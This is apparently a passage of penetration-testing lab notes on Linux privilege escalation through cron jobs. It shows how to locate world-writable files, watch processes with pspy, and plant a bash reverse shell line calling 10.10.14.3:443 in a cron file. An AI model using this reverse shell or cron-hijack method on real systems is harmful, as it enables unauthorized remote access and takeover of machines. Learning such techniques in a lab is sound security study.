
---
`crontab` command to create a cron file.

The cron file will be created in `/var/spool/cron`, some certain applications create cron files in the `/etc/cron.d`

Find writeable files : 
```bash
find / \( -path /proc -o -path /sys -o -path /dev \) -prune -o -type f -perm -o+w 2>/dev/null
#find files exclude path under /pron /sys /dev, there're vettual or device files.
```

`pspy` : A command-line tool used to view running processes without the need for root privileges.
```bash
./pspy64 -pf -i 1000
# -pf : Print commands and file system events
# -i 1000 : Scan procfs every 1000ms(or every second).
```

Add a reverse shell command in cron file :
```bash
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```